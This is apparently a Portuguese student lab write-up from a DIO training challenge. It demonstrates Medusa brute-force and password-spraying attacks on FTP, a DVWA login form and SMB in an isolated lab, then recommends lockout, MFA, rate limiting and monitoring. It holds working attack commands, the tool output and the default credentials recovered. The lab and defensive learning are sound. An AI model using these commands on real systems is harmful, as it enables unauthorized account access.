# DIO-Desafio-Medusa-BruteForce
Este projeto, parte do desafio prático da DIO, demonstra a execução e a mitigação de ataques de força bruta em um ambiente de teste seguro. O objetivo principal é transformar a experiência ofensiva (usando Kali e Medusa) em conhecimento defensivo (propondo mitigações eficazes).

⚠️ Declaração de Ética: Todos os testes foram conduzidos em máquinas virtuais alvos intencionalmente vulneráveis (Metasploitable 2 e DVWA) dentro de uma rede isolada (Host-Only). Nenhuma máquina ou sistema real foi atacado.

⚙️ Configuração do Ambiente de Teste
Máquina Virtual	Sistema Operacional	Função	Endereço IP (Exemplo)
VM Atacante	Kali Linux	Pentest / Auditoria (Medusa)	192.168.1.10
VM Alvo	Metasploitable 2/DVWA	Alvo vulnerável	192.168.1.101

📝 Wordlists Utilizadas
    users.txt: msfadmin, user, users, adm, admin, administrador.
    passwords.txt: msfadmin, password, senha, 123, 1234, 12345, 123456.
    spray_users.txt: Lista maior de nomes de usuário (simulando enumeração) para o teste de Password Spraying.

💥 Análise de Ataques Simulados
Detalhes dos comandos utilizados e dos resultados obtidos.
1. Cenário: Força Bruta em FTP (Protocolo de Transferência de Arquivos)
O serviço FTP no Metasploitable 2 (vsftpd 2.3.4) é conhecido por ser vulnerável a credenciais padrão.
Detalhe	Informação
Serviço Alvo	FTP (21/tcp)
Ferramenta	Medusa
Comando Utilizado	medusa -h 192.168.1.101 -U users.txt -P passwords.txt -M ftp -O ftp_results.txt
Saída da Ferramenta	ACCOUNT FOUND: [192.168.1.101]:21:msfadmin:msfadmin
Credencial Encontrada	msfadmin:msfadmin
Validação	O acesso foi validado usando o cliente FTP do Kali: ftp 192.168.1.101

2. Cenário: Automação de Tentativas em Formulário Web (DVWA)
Focamos no módulo Brute Force do DVWA (nível de segurança Low), que não tem proteção contra força bruta.
Detalhe	Informação
Serviço Alvo	HTTP Login (/vulnerabilities/brute/)
Ferramenta	Medusa (Módulo http)
POST Data (Identificado)	username=^U&password=^P&Login=Login
String de Erro	Username and/or password incorrect.
Comando Utilizado	medusa -h 192.168.1.101 -u users.txt -p passwords.txt -M http -m "POST /dvwa/login.php" -d "username=^U&password=^P&Login=Login" -r "Username and/or password incorrect."
Saída da Ferramenta	ACCOUNT FOUND: [192.168.1.101]:80:admin:password
Credencial Encontrada	admin:password

3. Cenário: Password Spraying em SMB (Protocolo de Compartilhamento de Rede)

O ataque testou uma única senha comum contra múltiplos usuários (simulando o resultado de uma enumeração bem-sucedida).
Detalhe	Informação
Serviço Alvo	SMB (445/tcp)
Técnica	Password Spraying (utilizando apenas a senha Password123)
Comando Utilizado	medusa -h 192.168.1.101 -U spray_users.txt -p "Password123" -M smb -n
Saída da Ferramenta	ACCOUNT FOUND: [192.168.1.101]:445:user:Password123
Credencial Encontrada	user:Password123
Reflexão	A vulnerabilidade reside na falta de uma política de bloqueio por senha incorreta, permitindo que a senha fraca comum funcione em uma conta.

🛑 Recomendações de Mitigação e Defesa
A mitigação é a etapa mais crítica, convertendo a descoberta da vulnerabilidade em proteção.

1. Políticas de Senhas Robustas e Padrões de Credenciais
    Ação: Proibir credenciais padrão de fábrica (msfadmin: msfadmin, admin: password) e implementar senhas complexas (com letras maiúsculas e minúsculas, números e caracteres especiais).
    Serviços Afetados: Todos (FTP, SMB, Web).

2. Implementação de Bloqueio de Contas (Account Lockout)
    Ação: Configurar o sistema operacional/servidor para bloquear temporariamente a conta (ex: 30 minutos) após 3 a 5 tentativas de login falhas.
    Serviços Afetados: FTP e SMB (prevenindo força bruta e password spraying).

3. Defesa Específica para Aplicações Web
    Ação: Implementar Limitação de Taxa (Throttling) de requisições por IP no firewall ou Web Application Firewall (WAF).
    Ação: Adicionar CAPTCHA após a primeira ou segunda falha de login para dificultar a automação (como visto no teste do DVWA).
    Serviços Afetados: Aplicações Web (DVWA).

4. Monitoramento Ativo de Logs e IDS/IPS
    Ação: Utilizar ferramentas como Fail2Ban ou sistemas de detecção de intrusão (IDS) para monitorar logs de login (ex: /var/log/auth.log no Linux).
    Ação: Bloquear automaticamente o IP do atacante (negar tráfego via Iptables/Firewall) ao detectar um número excessivo de falhas de login em um curto período.
    Serviços Afetados: Todos.

5. Uso de Autenticação de Múltiplos Fatores (MFA)
    Ação: Para acesso administrativo ou remoto (como SSH, VPN, VNC), exigir MFA. Isso tornaria todas as credenciais encontradas inúteis sem o segundo fator.
